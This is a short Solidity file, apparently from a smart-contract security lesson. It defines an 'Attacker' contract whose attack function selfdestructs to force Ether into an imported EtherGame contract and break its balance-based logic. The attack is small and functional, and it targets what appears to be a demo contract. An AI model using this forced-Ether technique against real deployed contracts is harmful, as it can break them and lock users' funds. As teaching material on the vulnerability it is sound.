// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./EtherGame.sol";
contract Attacker {

    function attack(address payable _etherGameAddress) external payable {
        selfdestruct(_etherGameAddress);
    }
}